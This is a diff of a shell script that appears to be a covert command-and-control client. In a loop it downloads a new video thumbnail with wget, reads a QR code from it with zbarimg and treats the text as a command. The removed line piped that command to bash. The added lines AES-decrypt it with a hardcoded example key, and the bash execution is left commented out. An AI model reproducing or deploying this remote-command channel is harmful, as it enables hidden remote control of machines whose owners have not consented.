@@ -19,7 +19,19 @@ do
         echo "New video thumbnail: $newest_video_url"
         wget -O "$(dirname "$(readlink -f "$0")")/command.jpg" $newest_video_url
         exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)
-        echo $exec | bash
+
+        key_hex="4326462948404d635166546a576e5a72" #Please change, this is just used for the example!
+
+        encrypted_data=$exec
+
+        decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)
+
+        decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')
+
+        echo "Decrypted data: $decrypted_data"
+
+        #echo $exec
+        #echo $exec | bash
         video_save=$newest_video_url
     fi
     sleep 30
